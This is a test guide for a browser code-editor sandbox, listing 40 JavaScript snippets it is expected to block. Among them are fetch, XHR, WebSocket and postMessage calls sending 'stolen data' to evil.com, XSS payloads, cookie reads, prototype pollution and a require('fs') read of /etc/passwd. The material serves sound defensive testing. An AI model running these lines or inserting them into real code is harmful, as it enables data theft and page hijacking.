# Security Test Examples

Use these malicious code examples to test that the security system is working correctly. **All of these should be blocked or prevented from executing.**

## Test Instructions

1. Copy each example code block
2. Paste it into the code editor
3. Click "Run Code"
4. Verify that the code is blocked with a security error message

---

## 1. Direct Eval Attack
**Expected:** Should be blocked - "Dangerous pattern detected: eval()"

```javascript
eval('console.log("Malicious code executed!")');
```

---

## 2. Function Constructor Attack
**Expected:** Should be blocked - "Dangerous function call detected: Function()"

```javascript
const fn = new Function('console.log("Code injection via Function constructor")');
fn();
```

---

## 3. Window Access Attack
**Expected:** Should be blocked - "Dangerous pattern detected: window"

```javascript
window.location = 'http://evil.com/steal';
console.log('Redirected to evil site');
```

---

## 4. Document Access Attack
**Expected:** Should be blocked - "Dangerous pattern detected: document"

```javascript
document.body.innerHTML = '<script>alert("XSS Attack!")</script>';
console.log('DOM manipulated');
```

---

## 5. Fetch Data Exfiltration
**Expected:** Should be blocked - "Dangerous pattern detected: fetch()"

```javascript
fetch('http://evil.com/steal?data=' + 'sensitive information')
  .then(() => console.log('Data sent to attacker'));
```

---

## 6. XMLHttpRequest Attack
**Expected:** Should be blocked - "Dangerous pattern detected: XMLHttpRequest"

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'http://evil.com/steal');
xhr.send('stolen data');
```

---

## 7. LocalStorage Access
**Expected:** Should be blocked - "Dangerous pattern detected: localStorage"

```javascript
localStorage.setItem('stolen', 'sensitive data');
console.log('Data stored:', localStorage.getItem('stolen'));
```

---

## 8. SessionStorage Access
**Expected:** Should be blocked - "Dangerous pattern detected: sessionStorage"

```javascript
sessionStorage.setItem('token', 'stolen-token-12345');
console.log('Token stolen');
```

---

## 9. Cookie Theft
**Expected:** Should be blocked - "Dangerous pattern detected: document.cookie"

```javascript
const cookies = document.cookie;
console.log('Cookies stolen:', cookies);
```

---

## 10. InnerHTML XSS Attack
**Expected:** Should be blocked - "Dangerous pattern detected: innerHTML"

```javascript
const div = { innerHTML: '<script>alert("XSS")</script>' };
div.innerHTML = '<img src=x onerror=alert("XSS")>';
console.log('XSS payload injected');
```

---

## 11. Prototype Pollution Attack
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
const obj = {};
obj.__proto__.isAdmin = true;
console.log('Prototype polluted');
```

---

## 12. Constructor Manipulation
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
const arr = [];
arr.constructor.prototype.polluted = true;
console.log('Array prototype polluted');
```

---

## 13. Require/Import Attack
**Expected:** Should be blocked - "Dangerous pattern detected: require()" or "import"

```javascript
require('fs').readFileSync('/etc/passwd');
```

```javascript
import('http://evil.com/malicious.js');
```

---

## 14. PostMessage Data Exfiltration
**Expected:** Should be blocked - "Dangerous pattern detected: postMessage()"

```javascript
postMessage('stolen data', 'http://evil.com');
console.log('Data sent via postMessage');
```

---

## 15. WebSocket Attack
**Expected:** Should be blocked - "Dangerous pattern detected: WebSocket"

```javascript
const ws = new WebSocket('ws://evil.com');
ws.send('stolen information');
```

---

## 16. Base64 Obfuscation Attempt
**Expected:** Should be blocked - "Dangerous pattern detected: atob()" or "btoa()"

```javascript
const encoded = btoa('malicious code');
const decoded = atob(encoded);
eval(decoded);
```

---

## 17. Unicode Escape Obfuscation
**Expected:** Should be blocked - Unicode escapes detected and removed

```javascript
const code = '\u0065\u0076\u0061\u006c'; // "eval" in unicode
console.log('Obfuscated code:', code);
```

---

## 18. With Statement Attack
**Expected:** Should be blocked - "Dangerous pattern detected: with()"

```javascript
with (Math) {
  console.log('With statement used');
}
```

---

## 19. Debugger Statement
**Expected:** Should be blocked - "Dangerous pattern detected: debugger"

```javascript
debugger;
console.log('Debugger triggered');
```

---

## 20. Infinite Loop Attack
**Expected:** Should timeout after 5 seconds - "Execution timeout exceeded"

```javascript
while(true) {
  console.log('Infinite loop');
}
```

---

## 21. Deep Recursion Attack
**Expected:** Should show warning about deep nesting

```javascript
function recurse(depth) {
  if (depth > 0) {
    return recurse(depth - 1);
  }
  return 'done';
}
recurse(100);
```

---

## 22. setTimeout with String (Code Injection)
**Expected:** Should be blocked - "Dangerous pattern detected: setTimeout()"

```javascript
setTimeout('console.log("Code injection via setTimeout")', 1000);
```

---

## 23. setInterval Attack
**Expected:** Should be blocked - "Dangerous pattern detected: setInterval()"

```javascript
setInterval('console.log("Repeated attack")', 1000);
```

---

## 24. Navigator Access
**Expected:** Should be blocked - "Dangerous pattern detected: navigator"

```javascript
console.log('User agent:', navigator.userAgent);
console.log('Platform:', navigator.platform);
```

---

## 25. Location Manipulation
**Expected:** Should be blocked - "Dangerous pattern detected: location"

```javascript
location.href = 'http://evil.com';
console.log('Redirected');
```

---

## 26. History Manipulation
**Expected:** Should be blocked - "Dangerous pattern detected: history"

```javascript
history.pushState({}, '', 'http://evil.com');
console.log('History manipulated');
```

---

## 27. Service Worker Registration
**Expected:** Should be blocked - "Dangerous pattern detected: serviceWorker"

```javascript
navigator.serviceWorker.register('evil-worker.js');
console.log('Service worker registered');
```

---

## 28. Geolocation Access
**Expected:** Should be blocked - "Dangerous pattern detected: navigator.geolocation"

```javascript
navigator.geolocation.getCurrentPosition((pos) => {
  console.log('Location stolen:', pos.coords);
});
```

---

## 29. Media Devices Access
**Expected:** Should be blocked - "Dangerous pattern detected: getUserMedia()"

```javascript
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => console.log('Camera accessed'));
```

---

## 30. WebRTC Attack
**Expected:** Should be blocked - "Dangerous pattern detected: RTCPeerConnection"

```javascript
const pc = new RTCPeerConnection();
console.log('WebRTC connection created');
```

---

## 31. SharedArrayBuffer Attack
**Expected:** Should be blocked - "Dangerous pattern detected: SharedArrayBuffer"

```javascript
const buffer = new SharedArrayBuffer(1024);
console.log('SharedArrayBuffer created');
```

---

## 32. WebAssembly Attack
**Expected:** Should be blocked - "Dangerous pattern detected: WebAssembly"

```javascript
WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109]));
console.log('WebAssembly executed');
```

---

## 33. Proxy Attack
**Expected:** Should be blocked - "Dangerous pattern detected: Proxy()"

```javascript
const handler = {
  get: (target, prop) => {
    console.log('Property accessed:', prop);
    return target[prop];
  }
};
const proxy = new Proxy({}, handler);
proxy.test;
```

---

## 34. Reflect API Attack
**Expected:** Should be blocked - "Dangerous pattern detected: Reflect"

```javascript
const obj = { data: 'secret' };
const value = Reflect.get(obj, 'data');
console.log('Data accessed via Reflect:', value);
```

---

## 35. Combined Attack (Multiple Vectors)
**Expected:** Should be blocked - Multiple errors detected

```javascript
// Try multiple attack vectors
eval('fetch("http://evil.com")');
window.location = 'http://evil.com';
localStorage.setItem('stolen', 'data');
document.body.innerHTML = '<script>alert("XSS")</script>';
```

---

## 36. Obfuscated Eval
**Expected:** Should be blocked - Pattern matching should catch this

```javascript
const e = 'ev';
const v = 'al';
const fn = e + v;
globalThis[fn]('console.log("Obfuscated eval")');
```

---

## 37. Constructor Chain Attack
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
const obj = {};
obj.constructor.prototype.isAdmin = true;
console.log('Constructor chain attack');
```

---

## 38. Object Prototype Manipulation
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
Object.prototype.polluted = true;
console.log('Object prototype polluted');
```

---

## 39. Array Prototype Manipulation
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
Array.prototype.polluted = true;
console.log('Array prototype polluted');
```

---

## 40. String Prototype Manipulation
**Expected:** Should be blocked - "Prototype pollution attempt detected"

```javascript
String.prototype.polluted = true;
console.log('String prototype polluted');
```

---

## Expected Behavior Summary

When you run these malicious code examples, you should see:

1. **Security Error Messages**: Clear error messages indicating what was blocked
2. **No Code Execution**: The malicious code should NOT execute
3. **Warnings Display**: Security warnings should appear in the UI
4. **Rate Limiting**: After 10 attempts, rate limiting should activate
5. **Timeout Protection**: Infinite loops should timeout after 5 seconds

## Safe Code Examples (Should Work)

These examples should execute successfully:

```javascript
// Simple math
console.log(2 + 2);
console.log(Math.sqrt(16));

// String operations
const name = 'World';
console.log('Hello, ' + name + '!');

// Array operations
const arr = [1, 2, 3];
console.log(arr.map(x => x * 2));

// Object operations
const obj = { a: 1, b: 2 };
console.log(Object.keys(obj));

// Date operations
const now = new Date();
console.log(now.toISOString());

// JSON operations
const data = { name: 'test', value: 123 };
console.log(JSON.stringify(data));
```

---

## Testing Checklist

- [ ] Eval attacks are blocked
- [ ] Function constructor attacks are blocked
- [ ] Window/document access is blocked
- [ ] Network requests (fetch, XHR) are blocked
- [ ] Storage access is blocked
- [ ] DOM manipulation is blocked
- [ ] Prototype pollution is blocked
- [ ] XSS vectors are blocked
- [ ] Obfuscation attempts are detected
- [ ] Infinite loops timeout
- [ ] Rate limiting works
- [ ] Safe code still executes correctly

